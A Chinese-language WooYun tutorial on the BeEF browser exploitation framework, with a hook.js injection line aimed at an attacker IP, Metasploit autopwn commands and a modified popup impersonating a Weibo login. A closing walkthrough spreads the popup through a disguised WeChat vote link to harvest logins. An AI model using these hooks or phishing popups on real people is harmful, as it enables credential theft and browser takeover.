@@ -1,0 +1,126 @@
+<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">浏览器利用框架BeEF测试</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">三好学生</a> <span class="bull">·</span> <time title="2015/10/23 10:18" ui-time="" datetime="2015/10/23 10:18" class="published ng-binding ng-isolate-scope">2015/10/23 10:18</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 前言</h1><hr><p>BeEF，全称The Browser Exploitation Framework，是一款针对浏览器的渗透测试工具。 目前对其测试的文章不是很多，所以希望通过本次测试给大家带来全新的认识。</p><p><img alt="这里写图片描述" img-src="68e7f4893eb8c37f9d32414f709e3a2106db1940.jpg"></p><h1>0x01 简介</h1><hr><p>工具主页：<a href="http://beefproject.com">http://beefproject.com</a></p><p>工具框架:</p><p><img alt="这里写图片描述" img-src="06ff4eabfc20602671192c3ccf2dc0831cb2556e.jpg"></p><h1>0x02 测试环境</h1><hr><p>攻击主机:</p><pre><code>操作系统:Kali 1.0
+IP:192.168.16.245
+</code></pre><p>测试主机:</p><pre><code>操作系统:Win7x86
+IP:192.168.16.197
+</code></pre><p>路由器：</p><pre><code>WooyunWifi
+开启JS注入功能
+</code></pre><p><img alt="这里写图片描述" img-src="1f0092881dcb1c24b99540d30576d6f8b73e5ae9.jpg"></p><p><strong><em>Tips：</em></strong></p><pre><code>WooyunWifi开启JS注入功能后会对用户访问的页面加入JS代码，如果JS代码设置成如下格式，那么运行后会在BeEF控制端返回一个shell
+
+document.write("&lt;script language='javascript' src='http://192.168.16.245:3000/hook.js'&gt;&lt;/script&gt;");
+
+默认情况下JS注入附带缓存投毒功能，将视图缓存所有的页面至2099年，但可以通过清除所有缓存及浏览数据来清除缓存投毒的影响。
+</code></pre><p><img alt="这里写图片描述" img-src="207ac0a0029ed164b5954705a5bbd714b4a66e33.jpg"></p><h1>0x03 BeEF参数配置</h1><hr><p>BeEF在Kali下默认安装，直接找到对应图标启动即可，但是默认设置未同Metasploit关联，无法使用msf模块，因此需要作如下配置连接msf</p><h2>1、修改config.yaml</h2><p>编辑<br><code>/usr/share/beef-xss/config.yaml</code></p><pre><code>metasploit:
+            enable: false改为true
+</code></pre><p><img alt="这里写图片描述" img-src="ee9ef3f8df70142f794203f1e835a67929f1bff1.jpg"></p><p>编辑<br><code>/usr/share/beef-xss/extensions/demos/config.yaml</code></p><pre><code>enable:true改为false
+</code></pre><p>编辑<br><code>/usr/share/beef-xss/extensions/metasploit/config.yaml</code></p><pre><code>设置
+    ssl: true
+    ssl_version: 'TLSv1'
+</code></pre><p><img alt="这里写图片描述" img-src="7a6b622612f764a800b5221f397d637ad0c036e3.jpg"></p><h2>2、启动msf服务</h2><pre><code>service postgresql start
+service metasploit start
+msfconsole
+load msgrpc ServerHost=127.0.0.1 User=msf Pass=abc123 SSL=y
+</code></pre><h2>3、运行BeEF.rb</h2><pre><code>cd /usr/share/beef-xss/
+/usr/share/beef-xss/beef
+</code></pre><p>（启动后不要关闭，不然登录界面会提示密码错误）</p><p><img alt="这里写图片描述" img-src="3a18591f698922fcc5218e6f7ecfcbd2b62426cd.jpg"></p><h2>4、启动BeEF</h2><p>弹出浏览器，输入默认用户名口令beef，即可登陆</p><p>主界面如图</p><p><img alt="这里写图片描述" img-src="c0fc59eaf291f59923134cef3de1e711f9266ba8.jpg"></p><h1>0x04 功能介绍</h1><hr><p>对基本功能做全面介绍，高级用法以后会做补充</p><h2>1-信息收集</h2><p><strong>1、浏览器信息</strong> 可收集：</p><pre><code>浏览器名称版本
+浏览器用户版本
+插件（包括Java，ActiveX，VBS，Flash……）
+窗口大小
+</code></pre><p>收集方法：</p><p>（1）自动默认收集信息<br>如图</p><p><img alt="这里写图片描述" img-src="677e8112aa3467049058c4abbb630bb16ae037c3.jpg"></p><p>（2）插件收集信息<br>如图</p><p><img alt="这里写图片描述" img-src="8d48dfd3eb57b255eb96f7d56bfb7ef0f74a667a.jpg"></p><p><strong><em>Tips：</em></strong></p><pre><code>模块图标不同颜色对应不同的使用效果
+绿色：适用当前浏览器
+橙色：适用当前浏览器，但易被用户发现，social engineering模块默认为橙色
+红色：不适于当前浏览器，但仍可尝试
+</code></pre><p><strong>2、系统信息</strong></p><p>可收集：</p><pre><code>安装的软件(适用于IE下，Detect Software模块)
+注册表键值(适用于IE下，此时会弹出提示消息)
+内网IP(Java模块得到授权)
+系统详情(通过JavaApplet获取系统版本、Java VM details、NIC names and IP、处理器、内存、屏幕显示模式)
+定位(通过Google maps)
+剪贴板信息(会弹出提示消息)
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="eaf68299ba7a705a0af5e9edf41841aa55559fc6.jpg"></p><p><img alt="这里写图片描述" img-src="0f6f8803cc86827b4129c0aec5c56b0197f4ee59.jpg"></p><p><img alt="这里写图片描述" img-src="7cafc26bfc37c422b846bbbb581cfad042ee2b19.jpg"></p><p><strong>3、用户行为</strong></p><p>可收集：</p><pre><code>用户是否访问过某URL、domain
+是否登录特定网站账号
+是否使用TOR
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="9b7d1abcbc5e24f0b4f072033bf7a4f898f5f2ee.jpg"></p><h2>2-社会工程</h2><p>如果使用BeEF控制了浏览器，那么就可以修改整个页面来尝试社会工程学</p><p><strong>1、提交登录信息</strong></p><p>简单粗暴往往是最有效的</p><p><strong>Pretty Theft模块:</strong></p><p>在网页弹出诱骗消息需要用户输入登录和密码，并解释该会话已超时</p><p>选择的登录框模板,如图</p><p><img alt="这里写图片描述" img-src="663d8579ab779611f0bd226f4b7e8e27989ccc74.jpg"></p><p>配置后用户浏览器界面,如图</p><p><img alt="这里写图片描述" img-src="84d95d1d6e40c2178f6dad32cb37d831dec7046c.jpg"></p><p>当用户输入信息后，自动获取，如图</p><p><img alt="这里写图片描述" img-src="1267f16bc175d92cd0ae430db2f045eae6fa5748.jpg"></p><p><strong>Simple Hijacker模块:</strong></p><p>劫持网页上面的所有链接，当用户点击任意链接时弹出诱骗消息，如果用户接着点击会跳转到指定域名<br>如图</p><p><img alt="这里写图片描述" img-src="7dda58a74d78e466becccd95ce6cc26ae9f11468.jpg"></p><p><img alt="这里写图片描述" img-src="7e8ffcbb9700e873d8618a8ec99b6892b6f5eace.jpg"></p><p><strong>Clippy模块：</strong></p><p>创建一个浏览器助手提示用户点击<br>如图</p><p><img alt="这里写图片描述" img-src="a9b24c6921f7022f875a1d8224cc61a9e4c5157b.jpg"></p><p><strong>2、重定向</strong></p><p><strong>Rediret Browser模块：</strong></p><p>将当前页面重定向至指定页面，有可能导致当前权限丢失</p><p><strong>Rediret Browser(iframe)模块：</strong></p><p>将当前页面重定向至指定页面，，同时保留当前连接，可以维持当前浏览器权限<br>如图</p><p><img alt="这里写图片描述" img-src="7fa2c24afb59124ade07f0e445e8d72d6e1d04f6.jpg"></p><p><img alt="这里写图片描述" img-src="ab2fb631bb2d64472fab066666952930dbd46a33.jpg"></p><p><strong>TabNabbing模块：</strong></p><p>当检测用户不在当前页面时启动定时器，倒计时结束后自动重定向至指定页面<br>如图</p><p><img alt="这里写图片描述" img-src="f380c33d9ded2f253e4fb272e2f9d04e46139837.jpg"></p><p><strong>3、Chrome/Firefox extensions</strong></p><p><strong>Fake Flash Update模块：</strong></p><p>提示用户安装Adobe Flash Player的更新，用户点击后会下载指定文件<br>如图</p><p><img alt="这里写图片描述" img-src="9d5f5b3a2e3cf028455c1b3cc7817a30b8b82285.jpg"></p><p><strong>Chrome Extensions 系列：</strong></p><p>值得尝试</p><p><img alt="这里写图片描述" img-src="5f6621f08f215ede7a53d1f3de079eed0130832e.jpg"></p><p><strong>4、补充</strong></p><p><strong>Clickjacking模块：</strong></p><p>可以使用multi-click clickjacking，判断当前用户鼠标位置，在不同位置可触发不同JS代码<br>如图，鼠标后面跟随一个iframe</p><p><img alt="这里写图片描述" img-src="ed9eeb18e402de623b3f8d174e91534a990a197a.jpg"></p><p><img alt="这里写图片描述" img-src="543733de50602b4d53dffe9745ebcca76ede6d45.jpg"></p><h2>3-网络扫描</h2><p>通过JavaScript，可以尝试利用浏览器扫描内网</p><p><strong>1、获取内网IP</strong></p><p><strong>Get Internal IP WebRTC模块：</strong></p><p>通过WebRTC获取内网IP</p><p><strong>Get Internal IP模块：</strong></p><p>通过Java Socket class获取内网IP</p><p><strong>2、识别局域网子网</strong></p><p>识别内网网关，如图</p><p><img alt="这里写图片描述" img-src="1fd492832dc0b51e24252c76aad1357476036669.jpg"></p><p><strong>3、识别HTTP Servers</strong></p><p>识别内网web servers</p><p><strong>4、ping操作</strong></p><p>调用ping命令扫描内网</p><p><strong>Ping Sweep模块 Ping Sweep (Java)模块</strong></p><p>如图</p><p><img alt="这里写图片描述" img-src="e41d63b9601e3b7d2065f397420bbd0dbad0381b.jpg"></p><p><strong>5、跨域扫描</strong></p><p><strong>6、DNS枚举</strong></p><p>如图</p><p><img alt="这里写图片描述" img-src="6e877c158b64f60d07f21bcb5f93abefb066d34c.jpg"></p><p><strong>7、端口扫描</strong></p><p><strong>Port Scanner模块</strong></p><p>如图</p><p><img alt="这里写图片描述" img-src="1a6bf89756d313fa8d9348ecb8627898ce113b5b.jpg"></p><p><img alt="这里写图片描述" img-src="21f687b7c768119dda4b6831aed6a1fb1f62700b.jpg"></p><p><strong>8、网络指纹特征扫描</strong></p><p>用来扫描内网中的Web服务器和网络设备</p><p><strong>Fingerprint Network模块</strong></p><p>如图</p><p><img alt="这里写图片描述" img-src="c20525022470867a59865ee3e83ee9cf66b8b161.jpg"></p><p><strong>9、Remote CSRFs</strong></p><p><strong>10、IRC NAT Pinning</strong></p><p>模拟浏览器的IRC通信，可用来绕过防火墙</p><p><strong>11、网络拓扑</strong></p><p>BeEF可根据扫描获得的信息绘制内网网络拓扑 如图</p><p><img alt="这里写图片描述" img-src="eb3631dddf9f319db71904f8d4f0f4e110fbb962.jpg"></p><p><img alt="这里写图片描述" img-src="07bdf7d3ff47754198b74f782e96e9d35f6a98e7.jpg"></p><p><img alt="这里写图片描述" img-src="f0df8dec37787421e9c9b8eb30eff1afd7c31105.jpg"></p><p>此部分会在以后详细介绍</p><h2>4-结合Metasploit</h2><p><strong>1、Metasploit系列模块</strong></p><p>如图</p><p><img alt="这里写图片描述" img-src="0db557bf633a0ad166ac945110422ac4666be8b2.jpg"></p><p><strong>2、Browser Autopwn</strong></p><p>反弹回meterpreter</p><p>方法：</p><p><strong>（1）</strong>使用Metasploit的Browser Autopwn功能生成BrowserAutoPwn URL</p><pre><code>use auxiliary/server/browser_autopwn
+show options
+set LHOST 192.168.16.245
+set SRVHOST 192.168.16.245
+set SRVPORT 8881
+run -z
+</code></pre><p>生成一个链接，如图</p><p><img alt="这里写图片描述" img-src="6a3072d55750ddedc48726f64a77bca1f790bfa6.jpg"></p><p><img alt="这里写图片描述" img-src="4c08677fff0d2dfe6a596aa800d43a67267edf08.jpg"></p><p><strong>（2）</strong>使用"Create Invisible Iframe"模块加载autopwn页面</p><p>如图</p><p><img alt="这里写图片描述" img-src="b0d3b3162be3db3050697e10641573c43ecc40b6.jpg"></p><p><strong>（3）</strong>等待弹回shell</p><pre><code>sessions -l
+</code></pre><h2>5-Tunneling</h2><p>代理功能</p><p>方法：</p><p><strong>1、</strong>选择控制的浏览器</p><p>如图</p><p><img alt="这里写图片描述" img-src="f5d510a4f15bcd94c6614caa40a30be8d1298f74.jpg"></p><p><strong>2、</strong>浏览器代理设置</p><p>HTTP Proxy：127.0.0.1<br>Port：6789</p><p>如图</p><p><img alt="这里写图片描述" img-src="6bb72008c6b030ed27692524dc8a9248a7c33c3d.jpg"></p><p>细节以后补充</p><p><strong>3、</strong>访问同样网站，查看本机浏览器页面同被控浏览器页面内容是否相同（即不需要cookie可实现登录账号）</p><h2>6-XSS</h2><p>如图</p><p><img alt="这里写图片描述" img-src="7d5ae2f907c1e30b0d8036411dee9ffc5f39d4c1.jpg"></p><p>细节以后补充</p><h2>7-维持权限</h2><p><strong>1、Create Pop Under模块</strong></p><p>创建一个新窗口，如图</p><p><img alt="这里写图片描述" img-src="763b38784243793ac43491c1d7cd47bca278fc56.jpg"></p><p>反弹一个新权限，如图</p><p><img alt="这里写图片描述" img-src="e7b95c2dcb54c99612e1188655554b4d7f8eeaa2.jpg"></p><p><strong>2、Confirm Close Tab模块</strong></p><p>当用户关闭当前页面时，反复弹出确认是否关闭页面的消息</p><p><strong>3、Create Foreground iFrame模块</strong> 修改当前页面所有链接来避免离开当前页面<br>比如用户点击某个连接，会将新页面显示在当前页面上面，注意的是网址不会发送改变，如图：</p><p><img alt="这里写图片描述" img-src="5fef55c47f5d8d182199b85515b9a4ebf2c8bbdb.jpg"></p><p>正常访问的页面为：（注意看地址栏）</p><p><img alt="这里写图片描述" img-src="a70a9cc8c8e309a6928686754075ee999d0fd3f0.jpg"></p><p><strong>4、Man In The Browser模块</strong></p><p>可拦截修改页面内所有链接，当用户点击当前页面的任意链接后仍可维持权限（必须是同源的页面）<br>如果用户手动更改URL地址栏，无法维持权限</p><h1>0x05 小结</h1><hr><p>本文仅对BeEF的基本功能做了全面介绍，更多高级技巧很值得研究，例如利用BeEF内网渗透，利用代理不通过cookie登陆账户突破IP限制绑定等等。</p><p>测试过程难免会有疏忽遗漏，理解错误的地方欢迎指正，共同进步。</p><p>本文由三好学生原创并首发于乌云drops，转载请注明</p><h1>0x06 补充</h1><hr><p>对手机平台的微信使用BeEF进行模拟测试</p><p>手机系统:</p><pre><code>Android
+</code></pre><h2>1、上线方法：</h2><p><strong>1、扫描二维码</strong></p><p>扫描后在BeEF控制端看到手机上线，如图</p><p><img alt="这里写图片描述" img-src="2b84f61cd2502e28dade35ab8259df6bc307cf5d.jpg"></p><p>对此页面进行Google Phishing欺骗，如图</p><p><img alt="这里写图片描述" img-src="9339fe3b250cdda225ce8d1b938aafaa72bb29b7.jpg"></p><p><strong>注：</strong></p><p>在微信上面特别的地方在于此处无法看到包含的真实URL地址</p><p><strong>2、朋友圈分享</strong></p><p>将BeEF的上线地址做一下简单的伪装并分享到朋友圈，如图</p><p><img alt="这里写图片描述" img-src="134b554d846923dca6ed846ff3dcc236a47ccf8f.jpg"></p><p>在朋友圈中同样无法看到包含的真实URL地址，打开即为BeEF的hook页面，如图</p><p><img alt="这里写图片描述" img-src="d232bcbba09c7e764bad3cdc4f4ac9a7c9dca995.jpg"></p><p><strong>3、朋友发来的链接</strong></p><p>将此消息直接发给朋友，如图</p><p><img alt="这里写图片描述" img-src="1f2a045945f87168eacae579ed32b70eb7e48155.jpg"></p><p>我们可以看到伪造前的URL地址</p><p><strong>注：</strong></p><p>BeEF的hook页面可以自定义成更具欺骗性的内容，这是为了演示方便使用默认界面</p><h2>2、微信浏览器被Hook后可以做哪些操作</h2><p>也许有人会提出疑问：手机打开网址持续的时间很短，关闭当前页面后BeEF的shell就会下线</p><p><strong>解决方法：</strong></p><p>使用BeEF API，用户上线后能够自动执行批量命令，结合Persistence模块能够极大提高shell存活时间</p><p>除了与windows系统相关的信息无法获取，其他操作均能成功执行，并且BeEF为手机劫持提供了专门的模块系列——Phonegap，如图</p><p><img alt="这里写图片描述" img-src="f35921f8e5a2c78b294a463e0fd5297665807a00.jpg"></p><p>以下是经测试可以在Android上使用的模块：</p><pre><code>1、弹框
+2、重定向 
+3、查看是否访问过某些网站
+4、Creates an invisible iframe
+5、Social Engineering系列，如下图，仅作演示 
+6、msf系列
+7、NetWork系列，可以用来扫描同一内网下的windows主机
+</code></pre><p><img alt="这里写图片描述" img-src="7ca5231cf9666986ddfc0109a2dad6a39ef3466e.jpg"></p><p><strong>注：</strong></p><p>加载hook页面后，将手机屏幕关闭处于待机状态，BeEF仍然可以执行指令，或许这与手机系统相关，值得以后深入测试。</p><h1>0x07 利用朋友圈投票社工微博帐号实例</h1><hr><h2>1、伪造BeEF的hook页面</h2><p><strong>1、寻找模板</strong></p><p>随机找到一个投票的页面，保存为html</p><pre><code>http://mp.weixin.qq.com/s?__biz=MzA3MTM0NTgyNw==&amp;mid=400240804&amp;idx=1&amp;sn=d87655d4c67a8f39fc84b3cdcb4c1895&amp;scene=1&amp;srcid=1024yDcPJI2to0i3DmiVmj1L&amp;from=groupmessage&amp;isappinstalled=0#rd
+</code></pre><p><strong>2、替换hook页面</strong></p><p>在<code>use/share/beef-xss/extensions/demos/html</code>目录下，将上述html文件命名为basic.html并添加以下代码</p><pre><code>var commandModuleStr = '&lt;script src="' + window.location.protocol + '//' + window.location.host + '/hook.js" 
+type="text/javascript"&gt;&lt;\/script&gt;';
+        document.write(commandModuleStr);
+</code></pre><p>如图</p><p><img alt="这里写图片描述" img-src="714bfea145bcc3d83b7f6540bda59cb62a8f2b50.jpg"></p><p><img alt="这里写图片描述" img-src="d2068ec4447fb38d1c46d423e39df8661daa1b32.jpg"></p><p>上线页面已被修改</p><h2>2、修改BeEFsocial_engineering模块</h2><p>修改弹出对话框样式</p><p>将此文件use/share/beef-xss/modules/social_engineering/pretty_theft/command.js内容 对应部分替换如下：</p><pre><code>// Facebook floating div
+    function facebook() {
+
+        sneakydiv = document.createElement('div');
+        sneakydiv.setAttribute('id', 'popup');
+        sneakydiv.setAttribute('style', 'position:absolute; top:30%; left:2%; z-index:51; background-
+
+color:ffffff;');
+        document.body.appendChild(sneakydiv);
+
+        // Set appearance using styles, maybe cleaner way to do this with CSS block?
+        var windowborder = 'style="width:330px;background:white;border:10px #999999 solid;border-
+
+radius:8px"';
+        var windowmain = 'style="border:1px #555 solid;"';
+        var tbarstyle = 'style="color: rgb(255, 255, 255); background-color: rgb(255, 102, 0);font-size: 
+
+13px;font-family:tahoma,verdana,arial,sans-serif;font-weight: bold;padding: 5px;padding-left:8px;text-align: 
+
+left;height: 18px;"';
+        var bbarstyle = 'style="color: rgb(0, 0, 0);background-color: rgb(242, 242, 242);padding: 
+
+8px;text-align: right;border-top: 1px solid rgb(198, 198, 198);height:28px;margin-top:10px;"';
+        var messagestyle = 'style="align:left;font-size:11px;font-family:tahoma,verdana,arial,sans-
+
+serif;margin:10px 15px;line-height:12px;height:40px;"';
+        var box_prestyle = 'style="color: grey;font-size: 11px;font-weight: bold;font-family: 
+
+tahoma,verdana,arial,sans-serif;padding-left:30px;"';
+        var inputboxstyle = 'style="width:140px;font-size: 11px;height: 20px;line-height:20px;padding-
+
+left:4px;border-style: solid;border-width: 1px;border-color: rgb(255,102,0);"'; 
+        var buttonstyle = 'style="font-size: 13px;background:#ff6600;color:#fff;font-weight:bold;border: 
+
+1px #29447e solid;padding: 3px 3px 3px 3px;clear:both;margin-right:5px;"';
+
+            var title = '微博手机版安全登录';
+            var messagewords = '请输入您的用户名密码登录后进行投票。&lt;br/&gt;&lt;br/&gt;我们将对您的投票信息严格保密。';
+            var buttonLabel = '&lt;input type="button" name="ok" value="登录" id="ok" ' +buttonstyle+ ' 
+
+onClick="document.getElementById(\'buttonpress\').value=\'true\'" onMouseOver="this.bgColor=\'#00CC00\'" 
+
+onMouseOut="this.bgColor=\'#009900\'" bgColor=#009900&gt;';
+
+        // Build page including styles
+        sneakydiv.innerHTML= '&lt;div id="window_container" '+windowborder+ '&gt;&lt;div id="windowmain" ' 
+
++windowmain+ '&gt;&lt;div id="title_bar" ' +tbarstyle+ '&gt;' +title+ '&lt;/div&gt;&lt;p id="message" ' +messagestyle+ '&gt;' + 
+
+messagewords + '&lt;/p&gt;&lt;table&gt;&lt;tr&gt;&lt;td align="right"&gt; &lt;div id="box_pre" ' +box_prestyle+ '&gt;邮箱/会员帐号/手机号: 
+
+&lt;/div&gt;&lt;/td&gt;&lt;td align="left"&gt;&lt;input type="text" id="uname" value="" onkeydown="if (event.keyCode == 13) 
+
+document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ '/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;tr&gt;&lt;td align="right"&gt;&lt;div 
+
+id="box_pre" ' +box_prestyle+ '&gt;密码: &lt;/div&gt;&lt;/td&gt;&lt;td align="left"&gt;&lt;input type="password" id="pass" name="pass" 
+
+onkeydown="if (event.keyCode == 13) document.getElementById(\'buttonpress\').value=\'true\'"' +inputboxstyle+ 
+
+'/&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;' + '&lt;div id="bottom_bar" ' +bbarstyle+ '&gt;' +buttonLabel+ '&lt;input type="hidden" 
+
+id="buttonpress" name="buttonpress" value="false"/&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;';
+
+        // Repeatedly check if button has been pressed
+        credgrabber = setInterval(checker,1000);
+    }
+</code></pre><h2>3、实际操作</h2><p><strong>1、</strong>微信朋友圈发布投票消息，如图</p><p><img alt="这里写图片描述" img-src="9387c50c1353ad73d0ff9cf8b0b41ac08d201ab8.jpg"></p><p>用户点击后会打开我们伪造的投票页面，同时隐蔽加载hook.js，在BeEF端上线</p><p><strong>2、</strong>在用户手机弹出模拟微博登录的对话框</p><p>如图执行Pretty Theft模块</p><p><img alt="这里写图片描述" img-src="b10c4646e7ed6f828c0c54ee9c333c52e8a79813.jpg"></p><p>用户手机界面如图，弹出对话框提示输入登录消息</p><p><img alt="这里写图片描述" img-src="5d9426624e22fc3fa494b1557fe5cb77256b035d.jpg"></p><p>BeEF控制端返回用户输入消息，如图</p><p><img alt="这里写图片描述" img-src="85f00e2597ae3898897af56d44fe8117b824007d.jpg"></p><p><strong>3、</strong>用户提交后重定向至另一页面</p><p>BeEF控制端使用Redirect Browser（iFrame）模块，如图</p><p><img alt="这里写图片描述" img-src="bf206620f32a62b094025b9b8d891cff7dcb8f60.jpg"></p><p>用户手机界面如图</p><p><img alt="这里写图片描述" img-src="488c2d32660bed9532f713bd3715ac7d97788698.jpg"></p><p>至此，通过朋友圈投票获得微博帐号成功实现。</p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/tips/2245" rel="bookmark" id="re1">Mysql安全配置</a></li><li><a href="http://drops.wooyun.org/tips/151" rel="bookmark" id="re2">Browser Security-同源策略、伪URL的域</a></li><li><a href="http://drops.wooyun.org/%e8%bf%90%e7%bb%b4%e5%ae%89%e5%85%a8/2547" rel="bookmark" id="re3">Oracle安全配置</a></li><li><a href="http://drops.wooyun.org/tips/2113" rel="bookmark" id="re4">使用SQLMAP对网站和数据库进行SQL注入攻击</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2016-06-08 14:31:01</span></div><p></p><p>@表哥 对的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">表哥</span> <span class="reply-time">2016-06-07 17:46:37</span></div><p></p><p>请问：你这个在微信朋友圈分享，是不是需要beef在公网上的主机内呢<br>或者目标对象与你在同一个内网内</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">xsser_w</span> <span class="reply-time">2016-05-23 16:30:16</span></div><p></p><p>@三好学生 你的分享精神感动了我 跪谢你的前人探索精神！！ 握手</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ArcticWolf</span> <span class="reply-time">2016-03-12 11:36:05</span></div><p></p><p>service metasploit start==&gt;&gt;&gt; kali linux 2.0 /etc/init.d/postgresql start</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">成语</span> <span class="reply-time">2016-02-16 16:51:22</span></div><p></p><p>@三好学生 在关联metasploit时总出现API错误,请问遇到过吗?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-10-29 18:40:02</span></div><p></p><p>终于更新了～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-10-26 08:36:45</span></div><p></p><p>@ca1n 是的</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">多情公子</span> <span class="reply-time">2015-10-25 22:32:28</span></div><p></p><p>好强大，谢谢分享</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">ca1n</span> <span class="reply-time">2015-10-23 22:16:58</span></div><p></p><p>@三好学生 @乌帽子 应该改为TSLv1?</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-10-23 17:12:55</span></div><p></p><p>@_Evil https://twitter.com/WadeAlcorn,这是beefproject作者twitter,快去关注吧～</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">三好学生</span> <span class="reply-time">2015-10-23 17:11:43</span></div><p></p><p>@乌帽子 当时测试的时候虽然参照网上其他的教程但还是折腾了很久，在这里发一个实测成功的办法希望能节省大家时间:)</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">乌帽子</span> <span class="reply-time">2015-10-23 17:00:05</span></div><p></p><p>原来这里也要改！</p><p>/usr/share/beef-xss/extensions/metasploit/config.yaml</p><p>设置<br>ssl: true<br>ssl_version: &#039;TLSv1&#039;</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">90Snake</span> <span class="reply-time">2015-10-23 11:58:08</span></div><p></p><p>强大的Beef</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">_Evil</span> <span class="reply-time">2015-10-23 11:56:46</span></div><p></p><p>作者 允许我点个赞</p><p></p></div></div></div></div></div></main>
